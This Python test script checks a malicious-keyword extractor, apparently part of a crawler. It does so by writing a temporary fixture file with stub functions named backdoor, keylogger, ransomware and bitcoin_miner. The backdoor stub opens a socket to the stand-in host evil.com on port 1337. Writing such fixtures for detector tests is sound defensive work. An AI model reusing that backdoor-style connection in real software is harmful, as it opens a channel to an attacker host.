#!/usr/bin/env python3
"""
Simple test to verify basic keyword extraction functionality.
"""

import os
import tempfile
import sys
import shutil

# Add the crawler directory to the Python path  
sys.path.append(os.path.join(os.path.dirname(__file__), 'crawler'))

def test_simple_extraction():
    """Simple test of keyword extraction."""
    
    # Create a temporary directory with a test file
    test_dir = tempfile.mkdtemp(prefix="test_malware_")
    
    # Create a test Python file with malicious keywords
    test_content = """
import socket
import subprocess

def backdoor():
    sock = socket.socket()
    sock.connect(("evil.com", 1337))
    
def keylogger():
    pass
    
def ransomware():
    pass
    
def bitcoin_miner():
    pass
"""
    
    test_file = os.path.join(test_dir, "malicious.py")
    with open(test_file, 'w') as f:
        f.write(test_content)
    
    try:
        # Import and test the extractor
        from keyword_extractor import MaliciousKeywordExtractor
        
        extractor = MaliciousKeywordExtractor()
        
        # Test individual keyword extraction
        keywords = extractor.extract_keywords_from_code(test_content, '.py')
        print("Extracted keywords:", keywords)
        
        # Test repository analysis
        result = extractor.extract_keywords_from_repository(test_dir)
        print("Analysis result keys:", list(result.keys()))
        
        if result:
            print("Total keywords extracted:", result.get('total_keywords_extracted', 0))
            print("Malicious keywords:", result.get('malicious_keywords', {}))
            print("Malicious score:", result.get('malicious_score', 0))
        
        print("Test passed!")
        
    except Exception as e:
        print("Test failed:", str(e))
        import traceback
        traceback.print_exc()
    
    finally:
        # Clean up
        shutil.rmtree(test_dir, ignore_errors=True)

if __name__ == "__main__":
    test_simple_extraction()
